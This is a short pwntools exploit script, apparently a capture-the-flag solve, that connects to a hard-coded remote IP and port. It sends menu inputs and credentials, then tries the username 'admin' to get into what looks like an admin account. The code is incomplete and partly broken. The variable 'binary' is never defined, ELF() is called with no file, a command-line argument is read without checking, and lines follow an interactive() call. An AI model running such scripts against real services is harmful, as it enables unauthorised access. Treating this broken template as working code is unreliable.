#!/usr/bin/python
from pwn import *

context(terminal = ['xterm', 'splitw'])
#context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

#binary = ''

#elf = ELF(binary)

try:
	libc = ELF()
except:
	pass

try:
	p = remote('159.89.166.12', 12000)
except:
	p = process(binary)#, env = {'LD_PRELOAD': './libc'})
	if sys.argv[1] == 'd':
		gdb.attach(p)
p.sendline('1')
p.sendline('1111')
p.sendline('1111')


p.sendline('2')
p.sendline('1111')
p.sendline('1111')

p.sendline('3')

p.interactive()
p.sendline('1')
p.sendline('2222')
p.sendline('admin')

p.sendline('2')
p.sendline('admin')
p.sendline('1111')

p.interactive()
